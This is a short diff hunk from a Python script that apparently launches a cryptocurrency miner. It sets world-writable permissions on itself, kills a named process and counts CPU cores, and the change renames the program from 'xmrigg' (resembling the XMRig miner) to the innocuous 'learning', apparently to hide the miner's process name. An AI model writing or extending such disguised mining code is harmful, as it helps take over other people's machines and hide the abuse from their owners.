@@ -9,7 +9,7 @@ import multiprocessing
 import ast
 useproxy = 0
 os.system('chmod 777 ' + __file__)
-program = 'xmrigg'
+program = 'learning'
 os.system('pkill ' + program)
 cores = multiprocessing.cpu_count() - 1
 if cores <= 0:
